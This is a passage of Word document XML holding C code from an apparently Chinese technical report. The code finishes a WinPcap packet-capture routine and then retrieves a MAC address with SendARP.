      <w:r>
        <w:tab/>
        <w:t>/* If the interface is without addresses we suppose to be in a C class network */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46AA2120" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>netmask = 0xffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C59E46" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43558825" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4354CD6E" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//compile the filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2759D492" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>if (pcap_compile(adhandle, &amp;fcode, packet_filter, 1, netmask) &lt;0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3CB630" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00261E6B" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>fprintf(stderr, "\nUnable to compile the packet filter. Check the syntax.\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51698D37" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="595B6679" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="227722F9" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//set the filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F857D54" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>if (pcap_setfilter(adhandle, &amp;fcode)&lt;0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F25D54F" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797510B6" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>fprintf(stderr, "\nError setting the filter.\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B0F0E3B" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA1A781" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73A3D0EF" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>/* start the capture */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E934F31" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>pcap_loop(adhandle, 0, packet_handler, NULL);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2451FA12" w14:textId="77777777" w:rsidR="0061401E" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>return 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F35456" w14:textId="77777777" w:rsidR="0061401E" w:rsidRPr="00AB1C89" w:rsidRDefault="0061401E" w:rsidP="0061401E">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="40" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B55D56" w14:textId="77777777"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1121" w:name="_Toc482141261"/>
      <w:bookmarkStart w:id="1122" w:name="_Toc482141934"/>
      <w:bookmarkStart w:id="1123" w:name="_Toc482522654"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>MAC地址获取</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1121"/>
      <w:bookmarkEnd w:id="1122"/>
      <w:bookmarkEnd w:id="1123"/>
    </w:p>
    <w:p w14:paraId="39CA6BA2" w14:textId="68485E6E" w:rsidR="00D51734" w:rsidRPr="008776FD" w:rsidRDefault="00B263D3" w:rsidP="00B263D3">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
      </w:pP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258FF2F4" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>bool getMAC(char* SrcIpString, char* DestIpString)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6850F6" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F6AA70" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>DWORD dwRetVal;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF53F96" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>IPAddr SrcIp = inet_addr(SrcIpString);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A954079" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>IPAddr DestIp = inet_addr(DestIpString);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD739DA" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    //ULONG MacAddr[2];       /* for 6-byte hardware addresses */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD31624" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>ULONG PhysAddrLen = 6;  /* default to length of six bytes */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26055AE4" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="367CA163" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>BYTE *bPhysAddr;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66483485" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>unsigned int i;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B13BF2F" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>memset(&amp;MacAddr, 0xff, sizeof (MacAddr));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F9A6B5B" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22155083" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">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26BE6BE3" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="723DA314" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>dwRetVal = SendARP(DestIp, SrcIp, &amp;MacAddr, &amp;PhysAddrLen);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A61846" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//cout &lt;&lt; MacAddr &lt;&lt; endl;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFDFF63" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A3B3727" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>//cout &lt;&lt; PhysAddrLen &lt;&lt; endl;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CBFCA3B" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>if (dwRetVal == NO_ERROR) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BE0509" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">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38D40EAD" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>bPhysAddr = (BYTE *) &amp;MacAddr;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A43C59C" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>//cout &lt;&lt;"bphysAddr:"&lt;&lt; bPhysAddr &lt;&lt; endl;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5500C571" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>if (PhysAddrLen) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A35CBD" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>for (i = 0; i &lt; (int)PhysAddrLen; i++) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B298C96" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>if (i == (PhysAddrLen - 1))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74032CBB" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>printf("%.2X\n", (int)bPhysAddr[i]);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D804C2" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523B6602" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>printf("%.2X-", (int)bPhysAddr[i]);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC54B45" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE56929" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E003497" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68EE77DE" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>printf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7978F6" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>("Warning: SendArp completed successfully, but returned length=0\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12222BC5" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>return TRUE;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F5D319" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48B03834" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B68FFBA" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
        <w:t>else {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76275E6E" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>printf("Error: SendArp failed with error: %d", dwRetVal);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5E9653" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>switch (dwRetVal) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AB9CB70" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>case ERROR_GEN_FAILURE:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54BE66FF" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>printf(" (ERROR_GEN_FAILURE)\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27822047" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461CFCE3" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>case ERROR_INVALID_PARAMETER:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611E7A0A" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>printf(" (ERROR_INVALID_PARAMETER)\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="693CA8D9" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57267727" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>case ERROR_INVALID_USER_BUFFER:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B609B4" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>printf(" (ERROR_INVALID_USER_BUFFER)\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579F25DE" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F7C89A5" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>case ERROR_BAD_NET_NAME:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B94A2C" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>printf(" (ERROR_GEN_FAILURE)\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5F3B8C" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127C413B" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>case ERROR_BUFFER_OVERFLOW:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43DF1FF8" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>printf(" (ERROR_BUFFER_OVERFLOW)\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DA3506" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B310F69" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>case ERROR_NOT_FOUND:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7428D5A8" w14:textId="77777777" w:rsidR="00D51734" w:rsidRDefault="00D51734" w:rsidP="00D51734">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="0" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
